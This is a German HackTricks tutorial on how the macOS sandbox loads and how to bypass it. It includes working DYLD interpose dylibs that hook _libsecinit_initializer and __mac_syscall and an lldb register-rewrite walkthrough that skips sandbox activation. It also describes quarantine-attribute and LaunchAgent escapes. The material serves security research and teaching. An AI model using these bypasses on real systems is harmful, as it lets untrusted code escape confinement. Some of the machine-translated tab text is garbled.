# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks in PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## Sandbox-Ladevorgang

<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p>Bild von <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Im vorherigen Bild ist es möglich zu beobachten, **wie die Sandbox geladen wird**, wenn eine Anwendung mit der Berechtigung **`com.apple.security.app-sandbox`** ausgeführt wird.

Der Compiler wird `/usr/lib/libSystem.B.dylib` mit dem Binärprogramm verknüpfen.

Dann wird **`libSystem.B`** andere verschiedene Funktionen aufrufen, bis das **`xpc_pipe_routine`** die Berechtigungen der App an **`securityd`** sendet. Securityd überprüft, ob der Prozess innerhalb der Sandbox unter Quarantäne gestellt werden sollte, und wenn ja, wird er unter Quarantäne gestellt.\
Schließlich wird die Sandbox aktiviert, indem **`__sandbox_ms`** aufgerufen wird, der **`__mac_syscall`** aufrufen wird.

## Mögliche Umgehungen

### Umgehung der Quarantäne-Attribute

**Von sandboxierten Prozessen erstellte Dateien** erhalten das **Quarantäne-Attribut**, um das Entkommen aus der Sandbox zu verhindern. Wenn es jedoch gelingt, **einen `.app`-Ordner ohne das Quarantäne-Attribut** innerhalb einer sandboxierten Anwendung zu erstellen, könnte das App-Bundle-Binärprogramm auf **`/bin/bash`** zeigen und einige Umgebungsvariablen in der **plist** hinzufügen, um **`open`** zu missbrauchen und die neue App **unsandboxed zu starten**.

Dies wurde in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) getan.

{% hint style="danger" %}
Daher können Sie derzeit, wenn Sie in der Lage sind, einen Ordner mit einem Namen, der mit **`.app`** endet, ohne ein Quarantäne-Attribut zu erstellen, der Sandbox entkommen, da macOS nur das **Quarantäne-Attribut im** **`.app`-Ordner** und im **Hauptausführbaren** überprüft (und wir werden das Hauptausführbare auf **`/bin/bash`** zeigen).

Beachten Sie, dass, wenn ein .app-Bundle bereits autorisiert wurde, ausgeführt zu werden (es hat ein Quarantäne xttr mit der Flagge für die Autorisierung zum Ausführen), könnten Sie es auch missbrauchen... außer dass Sie jetzt nicht in **`.app`**-Bundles schreiben können, es sei denn, Sie haben einige privilegierte TCC-Berechtigungen (die Sie nicht in einer Sandbox mit hohen Berechtigungen haben werden).
{% endhint %}

### Missbrauch der Open-Funktionalität

In den [**letzten Beispielen des Word-Sandbox-Umgehungs**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) kann man sehen, wie die **`open`**-CLI-Funktionalität missbraucht werden kann, um die Sandbox zu umgehen.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Start Agents/Daemons

Auch wenn eine Anwendung dazu gedacht ist, sandboxiert zu sein (`com.apple.security.app-sandbox`), ist es möglich, die Sandbox zu umgehen, wenn sie z. B. von einem StartAgenten (`~/Library/LaunchAgents`) ausgeführt wird.\
Wie in [**diesem Beitrag**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818) erklärt, könnten Sie, wenn Sie Persistenz mit einer sandboxierten Anwendung erlangen möchten, diese automatisch als StartAgent ausführen lassen und möglicherweise bösartigen Code über DyLib-Umgebungsvariablen einschleusen.

### Missbrauch von Autostart-Orten

Wenn ein sandboxierter Prozess an einem Ort **schreiben kann**, an dem **später eine unsandboxierte Anwendung das Binärprogramm ausführen wird**, wird er in der Lage sein, **einfach durch Platzieren** des Binärprogramms dort zu **entkommen**. Ein gutes Beispiel für solche Orte sind `~/Library/LaunchAgents` oder `/System/Library/LaunchDaemons`.

Dafür benötigen Sie möglicherweise sogar **2 Schritte**: Einen Prozess mit einer **permissiveren Sandbox** (`file-read*`, `file-write*`) ausführen lassen, der Ihren Code ausführt, der tatsächlich an einem Ort schreibt, an dem er **unsandboxiert ausgeführt wird**.

Überprüfen Sie diese Seite zu **Autostart-Orten**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Missbrauch anderer Prozesse

Wenn Sie aus dem Sandbox-Prozess heraus in der Lage sind, **andere Prozesse zu kompromittieren**, die in weniger restriktiven Sandboxes (oder gar keiner) ausgeführt werden, können Sie aus deren Sandboxes entkommen:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statisches Kompilieren & Dynamisches Verknüpfen

[**Diese Forschung**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) entdeckte 2 Möglichkeiten, die Sandbox zu umgehen. Da die Sandbox aus dem Benutzerbereich angewendet wird, wenn die **libSystem**-Bibliothek geladen wird. Wenn ein Binärprogramm das Laden dieser Bibliothek vermeiden könnte, würde es nie in die Sandbox gelangen:

* Wenn das Binärprogramm **vollständig statisch kompiliert** wäre, könnte es das Laden dieser Bibliothek vermeiden.
* Wenn das **Binärprogramm keine Bibliotheken laden müsste** (weil der Linker auch in libSystem ist), müsste es libSystem nicht laden.

### Shellcodes

Beachten Sie, dass **selbst Shellcodes** in ARM64 in `libSystem.dylib` verknüpft werden müssen:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Berechtigungen

Beachten Sie, dass selbst wenn einige **Aktionen** möglicherweise **im Sandbox-Modus erlaubt sind**, wenn eine Anwendung über eine spezifische **Berechtigung** verfügt, wie zum Beispiel:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Umgehung

Für weitere Informationen über **Interposting** siehe:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpost `_libsecinit_initializer`, um die Sandbox zu verhindern
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` um die Sandbox zu verhindern

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & Umgehung der Sandbox mit lldb

Lassen Sie uns eine Anwendung kompilieren, die in der Sandbox ausgeführt werden soll:

{% tabs %}
{% tab title="sand.c" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}Inhalt: Dieses XML-Dokument definiert die Berechtigungen, die der Sandbox-Prozess haben soll. Es enthält eine Liste von Berechtigungen, die dem Prozess gewährt werden, um auf bestimmte Ressourcen zuzugreifen oder bestimmte Aktionen auszuführen. Diese Berechtigungen können verwendet werden, um die Sandbox zu umgehen oder zu debuggen. {% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{% endtab %}

{% tab title="Info.plist" %} 

### macOS-Sandbox-Debug-und-Bypass

In diesem Abschnitt werden verschiedene Techniken zum Debuggen und Umgehen von macOS-Sandbox-Anwendungen behandelt. Es werden Methoden diskutiert, um die Sandbox-Einschränkungen zu umgehen und potenzielle Schwachstellen auszunutzen. Dies ist nützlich für Sicherheitsforscher und Entwickler, um die Sicherheit von macOS-Anwendungen zu testen und zu verbessern.
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Dann kompilieren Sie die App:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Die App wird versuchen, die Datei **`~/Desktop/del.txt`** zu **lesen**, was die **Sandbox nicht erlauben wird**.\
Erstellen Sie eine Datei dort, da sobald die Sandbox umgangen ist, sie in der Lage sein wird, sie zu lesen:
```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Lassen Sie uns die Anwendung debuggen, um zu sehen, wann die Sandbox geladen wird:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
{% hint style="warning" %}
**Auch wenn die Sandbox umgangen wird, wird TCC** den Benutzer fragen, ob er dem Prozess erlauben möchte, Dateien vom Desktop zu lesen.
{% endhint %}

## Referenzen

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
